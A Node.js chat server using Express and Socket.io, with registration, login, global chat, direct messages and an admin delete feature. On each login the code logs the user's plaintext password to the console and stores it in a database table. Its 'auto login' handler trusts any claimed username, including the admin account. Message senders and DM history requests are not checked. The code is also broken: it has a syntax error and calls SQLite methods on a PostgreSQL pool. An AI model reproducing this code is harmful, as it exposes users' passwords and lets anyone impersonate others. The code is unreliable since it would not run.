const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
//const sqlite3 = require("sqlite3").verbose();
///////////////////////////////////////////////////////////
const { Pool } = require("pg");

const db = new Pool({
    connectionString: process.env.DATABASE_URL
    ssl: {
        rejectUnauthorized: false
    }
});
///////////////////////////////////////////////////////////
const bcrypt = require("bcrypt");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static("public"));

//const db = new sqlite3.Database("chat.db");

// =========================
// 👑 ADMIN
// =========================
const ADMIN = "Admin";

// =========================
// 📦 DB TABLES
// =========================
db.run(`
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT
)`);

db.run(`
CREATE TABLE IF NOT EXISTS messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user TEXT,
    text TEXT,
    time TEXT
)`);

db.run(`
CREATE TABLE IF NOT EXISTS dms (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sender TEXT,
    receiver TEXT,
    text TEXT,
    time TEXT
)`);

db.run(`
CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    time TEXT,
    password TEXT
)
`);

// =========================
// 🌐 ONLINE USERS
// =========================
const onlineUsers = {};

// =========================
// 🔧 HELPERS
// =========================
function emitUsers(socket, excludeUser) {
    db.all("SELECT username FROM users", (err, rows) => {
        if (err) return socket.emit("all users", []);

        const users = rows
            .map(r => r.username)
            .filter(u => u !== excludeUser && u !== ADMIN);

        socket.emit("all users", users);
    });
}

// broadcast users to ALL online clients
function broadcastUsers() {
    db.all("SELECT username FROM users", (err, rows) => {
        if (err) return;

        const users = rows.map(r => r.username);

        io.sockets.sockets.forEach((socket) => {
            if (!socket.username) return;

            socket.emit(
                "all users",
                users.filter(u => u !== socket.username && u !== ADMIN)
            );
        });
    });
}

// =========================
// SOCKET
// =========================
io.on("connection", (socket) => {

    console.log("USER CONNECTED");

    // =========================
    // LOAD GLOBAL CHAT
    // =========================
    socket.on("load messages", () => {
        db.all("SELECT * FROM messages ORDER BY id ASC", (err, rows) => {
            if (err) return console.error(err);
            socket.emit("load messages", rows);
        });
    });

    // =========================
    // REGISTER
    // =========================
    socket.on("register", ({ username, password }) => {

        db.get(
            "SELECT username FROM users WHERE username = ?",
            [username],
            (err, row) => {

                if (err) return socket.emit("register error", "DB error");

                if (row) {
                    return socket.emit("register error", "User exists");
                }

                bcrypt.hash(password, 10, (err, hash) => {
                    if (err) return socket.emit("register error", "Hash error");

                    db.run(
                        "INSERT INTO users (username, password) VALUES (?, ?)",
                        [username, hash],
                        function (err) {

                            if (err) return socket.emit("register error", "Insert error");

                            socket.username = username;
                            onlineUsers[username] = socket.id;

                            socket.emit("register success", username);

                            emitUsers(socket, username);
                        }
                    );
                });
            }
        );
    });

    // =========================
    // LOGIN
    // =========================
    socket.on("login", ({ username, password }) => {

        db.get(
            "SELECT * FROM users WHERE username = ?",
            [username],
            (err, row) => {

                if (err) return socket.emit("login error", "DB error");
                if (!row) return socket.emit("login error", "User not found");

                bcrypt.compare(password, row.password, (err, ok) => {

                    if (!ok) return socket.emit("login error", "Wrong password");

                    socket.username = username;
                    onlineUsers[username] = socket.id;

                    console.log("Přihlášen uživatel:", username, password);

                    socket.emit("login success", username);

                    emitUsers(socket, username);

                    const time = new Date().toLocaleString();

                    db.run(
                        "INSERT INTO login_logs (username, time, password) VALUES (?, ?, ?)",
                        [username, time, password]
                    );
                });
            }
        );
    });

    // =========================
    // AUTO LOGIN (FIXED)
    // =========================
    socket.on("auto login", (username) => {

        if (!username) return;

        socket.username = username;
        onlineUsers[username] = socket.id;

        // 🔥 malý delay zajistí, že klient už má listener ready
        setTimeout(() => {
            emitUsers(socket, username);
        }, 50);
    });

    // =========================
    // GET USERS (MANUAL REFRESH)
    // =========================
    socket.on("get all users", () => {

        if (!socket.username) return;

        emitUsers(socket, socket.username);
    });

    // =========================
    // GLOBAL MESSAGE
    // =========================
    socket.on("chat message", (msg) => {

        const time = new Date().toLocaleTimeString();

        db.run(
            "INSERT INTO messages (user, text, time) VALUES (?, ?, ?)",
            [msg.user, msg.text, time],
            function () {

                io.emit("chat message", {
                    id: this.lastID,
                    user: msg.user,
                    text: msg.text,
                    time
                });
            }
        );
    });

    // =========================
    // DM MESSAGE
    // =========================
    socket.on("dm message", ({ sender, receiver, text }) => {

        const time = new Date().toLocaleTimeString();

        db.run(
            "INSERT INTO dms (sender, receiver, text, time) VALUES (?, ?, ?, ?)",
            [sender, receiver, text, time]
        );

        const target = onlineUsers[receiver];

        if (target) {
            io.to(target).emit("dm message", { sender, text, time });
        }

        socket.emit("dm message", { sender, text, time });
    });

    // =========================
    // DM HISTORY
    // =========================
    socket.on("load dm history", ({ user1, user2 }) => {

        const sql = `
            SELECT * FROM dms
            WHERE (sender = ? AND receiver = ?)
            OR (sender = ? AND receiver = ?)
            ORDER BY id ASC
        `;

        db.all(sql, [user1, user2, user2, user1], (err, rows) => {
            if (err) return console.error(err);
            socket.emit("dm history", rows);
        });
    });

    // =========================
    // DELETE MESSAGE (ADMIN)
    // =========================
    socket.on("delete message", (id) => {

        if (socket.username !== ADMIN) return;

        db.run("DELETE FROM messages WHERE id = ?", [id], (err) => {
            if (err) return console.error(err);
            io.emit("message deleted", id);
        });
    });

    // =========================
    // DISCONNECT
    // =========================
    socket.on("disconnect", () => {

        if (socket.username) {
            delete onlineUsers[socket.username];

            // 🔥 po odpojení aktualizuj ostatní
            broadcastUsers();
        }
    });
});

server.listen(3000, () => {
    console.log("http://localhost:3000");
});

